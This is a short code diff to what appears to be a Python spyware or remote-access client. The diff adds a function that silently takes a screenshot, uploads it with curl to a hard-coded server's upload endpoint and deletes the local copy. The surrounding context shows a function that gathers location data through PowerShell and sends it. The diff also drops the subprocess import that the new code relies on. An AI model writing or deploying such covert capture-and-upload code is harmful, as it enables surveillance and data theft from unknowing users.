@@ -5,10 +5,22 @@ import shlex
 import threading
 import sys
 import webbrowser
-import json
 SERVER_URL = "http://192.168.88.105:2020"
-import subprocess
 import shlex
+import pyautogui
+import random
+def send_screenshot():
+    filename = f"{random.randint(100000,999999)}.png"
+    screenshot = pyautogui.screenshot()
+    screenshot.save(filename)
+    command = [
+        "curl",
+        "-X", "POST",
+        f"{SERVER_URL}/upload",
+        "-F", f"files=@{filename}"
+    ]
+    subprocess.run(command, capture_output=True, text=True)
+    os.remove(filename)
 def get_location_and_send():
     ps_command = r'''
     Add-Type -AssemblyName System.Device
